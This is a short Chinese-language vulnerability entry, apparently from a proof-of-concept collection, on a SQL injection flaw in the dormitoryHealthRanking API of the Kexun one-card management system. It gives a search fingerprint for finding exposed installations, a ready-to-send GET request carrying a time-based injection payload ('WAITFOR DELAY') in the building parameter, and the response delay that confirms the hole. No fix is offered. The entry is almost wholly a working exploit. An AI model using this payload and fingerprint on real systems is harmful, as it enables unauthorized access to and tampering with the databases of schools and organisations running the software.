# 科讯一卡通管理系统dormitoryHealthRanking存在SQL注入漏洞

科讯一卡通管理系统 ｜ SQL注入 ｜ —
- **指纹**：`body="[http://www.ahkxsoft.com/"`
- **请求**：`GET /api/dormitoryHealthRanking?building=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1`
- **响应特征**：200 响应时间>=5s